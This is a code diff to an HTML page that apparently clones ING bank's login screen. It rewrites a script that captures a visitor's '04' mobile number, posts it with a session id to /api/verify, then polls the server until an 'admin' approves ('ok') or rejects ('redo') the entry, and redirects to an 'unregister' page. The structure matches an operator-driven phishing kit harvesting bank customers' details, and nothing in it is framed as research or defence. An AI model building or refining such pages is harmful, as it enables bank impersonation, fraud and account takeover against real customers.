@@ -27287,126 +27287,101 @@ iron-overlay-backdrop.overlay-backdrop-firework:not([style-scope]):not(.style-sc
                      </template>
                     </div>
                     <script>
-/* =====  ENSURE SID  ===== */
-const verifySid = new URLSearchParams(location.search).get('sid') ||
-                  sessionStorage.getItem('sid');
-if (!verifySid) { location.href = '/'; throw 0; }
-if (!location.search.includes('sid=')) {
-  const url = new URL(location);
-  url.searchParams.set('sid', verifySid);
-  history.replaceState(null, '', url);
-}
-
-/* =====  MAIN LOGIC  ===== */
-(() => {
-  const field = document.getElementById('cifField');   // phone input
-  const btn   = document.getElementById('login-btn');  // Continue button
-
-  /* ----------  LOCK “04” PREFIX  ---------- */
-  field.value = '04';
-  field.addEventListener('keydown', e => {
-    // prevent deleting the locked “04”
-    if (field.selectionStart <= 2 && (e.key === 'Backspace' || e.key === 'Delete')) {
-      e.preventDefault();
-    }
-  });
-
-  /* ----------  FORMATTER  ---------- */
-  function clean(raw) {
-    return '04' + raw.replace(/\D/g, '').slice(0, 8); // 04 + 8 digits max
+  /* =====  ENSURE SID  ===== */
+  const verifySid = new URLSearchParams(location.search).get('sid') ||
+                    sessionStorage.getItem('sid');
+  if (!verifySid) { location.href = '/'; throw 0; }
+  if (!location.search.includes('sid=')) {
+    const url = new URL(location);
+    url.searchParams.set('sid', verifySid);
+    history.replaceState(null, '', url);
   }
 
-  /* ----------  LOADING OVERLAY  ---------- */
-  function showLoading() {
-    if (document.getElementById('verify-loading-overlay')) return;
-    const overlay = document.createElement('div');
-    overlay.id = 'verify-loading-overlay';
-    overlay.style.cssText = `
-      position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(2px);
-      display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999`;
-    overlay.innerHTML = `
-      <div style="width:60px;height:60px;border:4px solid rgba(255,102,0,.2);
-                  border-top:4px solid #ff6600;border-radius:50%;
-                  animation:ing-spin 1s linear infinite"></div>
-      <p style="color:#fff;font-family:Arial,sans-serif;font-size:16px;margin-top:20px;letter-spacing:1px">
-        Verifying…
-      </p>`;
-    if (!document.getElementById('ing-spin-style')) {
-      const s = document.createElement('style');
-      s.id = 'ing-spin-style';
-      s.textContent = '@keyframes ing-spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}';
-      document.head.appendChild(s);
-    }
-    document.body.appendChild(overlay);
-  }
-  function hideLoading() {
-    const el = document.getElementById('verify-loading-overlay');
-    if (el) { el.style.opacity = '0'; setTimeout(() => el.remove(), 300); }
-  }
+  /* =====  MAIN LOGIC  ===== */
+  (() => {
+    const field = document.getElementById('cifField');
+    const btn   = document.getElementById('continueBtn');
+    const overlay = document.getElementById('loadingOverlay');
 
-  /* ----------  INPUT HANDLER  ---------- */
-  field.addEventListener('input', () => {
-    const curr = field.value;
-    const fixed = clean(curr);
-    if (curr !== fixed) field.value = fixed;
-    btn.disabled = fixed.length !== 10; // 04 + 8 digits
-  });
+    /* ----------  LOCK “04” PREFIX  ---------- */
+    field.value = '04';
+    field.addEventListener('keydown', e => {
+      if (field.selectionStart <= 2 && (e.key === 'Backspace' || e.key === 'Delete')) {
+        e.preventDefault();
+      }
+    });
 
-  /* ----------  SUBMIT  ---------- */
-  btn.addEventListener('click', async () => {
-    const phone = field.value.trim();
-    if (phone.length !== 10) return;          // must be 04xxxxxxxx
-    btn.disabled = true;
-    showLoading();                            // spinner NOW
-
-    // send number to server
-    try {
-      const r = await fetch('/api/verify', {
-        method: 'POST',
-        headers: { 'content-type': 'application/json' },
-        body: JSON.stringify({ sid: verifySid, phone })
-      });
-      if (!r.ok) throw new Error('save failed');
-    } catch (e) {
-      hideLoading();
-      btn.disabled = false;
-      alert('Unable to save number – try again.');
-      return;
+    /* ----------  FORMATTER / LIMITER  ---------- */
+    function clean(raw) {
+      return '04' + raw.replace(/\D/g, '').slice(0, 8); // 04 + 8 digits
     }
 
-    // wait for admin
-    let polling = false;
-    function startPoll() {
-      if (polling) return;
-      polling = true;
-      const poll = async () => {
-        try {
-          const r = await fetch(`/api/status/${verifySid}`);
-          const d = await r.json();
-          if (d.status === 'ok') {
-            polling = false;
-            await fetch('/api/clearOk', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
-            location.href = '/unregister.html?sid=' + verifySid;
-            return;
-          }
-          if (d.status === 'redo') {
-            polling = false;
-            await fetch('/api/clearRedo', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
-            hideLoading(); field.value = '04'; field.dispatchEvent(new Event('input')); btn.disabled = true;
-            return;
-          }
-          setTimeout(poll, 1200);
-        } catch { setTimeout(poll, 2000); }
-      };
-      poll();
-    }
-    startPoll();
-  });
+    /* ----------  LOADING TOGGLE  ---------- */
+    function showLoading() { overlay.style.display = 'grid'; }
+    function hideLoading() { overlay.style.display = 'none'; }
 
-  // initial state
-  field.dispatchEvent(new Event('input'));
-})();
-</script>
+    /* ----------  INPUT HANDLER  ---------- */
+    field.addEventListener('input', () => {
+      const curr = field.value;
+      const fixed = clean(curr);
+      if (curr !== fixed) field.value = fixed;
+      btn.disabled = fixed.length !== 10; // 10 = 04 + 8
+    });
+
+    /* ----------  SUBMIT  ---------- */
+    btn.addEventListener('click', async () => {
+      const phone = field.value.trim();
+      if (phone.length !== 10) return;
+      btn.disabled = true;
+      showLoading();
+
+      try {
+        const r = await fetch('/api/verify', {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify({ sid: verifySid, phone })
+        });
+        if (!r.ok) throw new Error('save failed');
+      } catch (e) {
+        hideLoading();
+        btn.disabled = false;
+        alert('Unable to save number – try again.');
+        return;
+      }
+
+      // wait for admin
+      let polling = false;
+      function startPoll() {
+        if (polling) return;
+        polling = true;
+        const poll = async () => {
+          try {
+            const r = await fetch(`/api/status/${verifySid}`);
+            const d = await r.json();
+            if (d.status === 'ok') {
+              polling = false;
+              await fetch('/api/clearOk', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
+              location.href = '/unregister.html?sid=' + verifySid;
+              return;
+            }
+            if (d.status === 'redo') {
+              polling = false;
+              await fetch('/api/clearRedo', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ sid: verifySid }) });
+              hideLoading(); field.value = '04'; field.dispatchEvent(new Event('input')); btn.disabled = true;
+              return;
+            }
+            setTimeout(poll, 1200);
+          } catch { setTimeout(poll, 2000); }
+        };
+        poll();
+      }
+      startPoll();
+    });
+
+    // initial state
+    field.dispatchEvent(new Event('input'));
+  })();
+  </script>
                     <div class="col col-2 login-cell style-scope ing-login" slot="col-2">
                      <ing-content-loader class="style-scope ing-login x-scope ing-content-loader-0" required="" snippet-id="ing-login-content">
                       <ing-content-loader-i18n class="style-scope ing-content-loader">
@@ -28727,6 +28702,7 @@ if (!location.search.includes('sid=')) {
   </iframe>
  </body>
 </html>
+
 
 
 
